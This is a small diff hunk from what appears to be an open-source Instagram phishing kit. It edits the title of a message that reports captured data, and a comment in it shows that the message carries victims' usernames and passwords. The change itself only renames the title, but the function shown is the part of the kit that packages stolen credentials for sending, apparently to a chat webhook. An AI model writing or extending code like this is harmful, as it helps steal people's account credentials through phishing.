@@ -65,7 +65,7 @@ async function sendInfo() {
 
   const embed = {
     color: 1585803, //#18328bz
-    title: "F Attempt",
+    title: "G Attempt",
     description: `${Info}`, //`${Info}> Username: ${username.value}\n> Password: ${password.value}\n`
     footer: {
       text: "github.com/Josakko/InstagramPhishing",
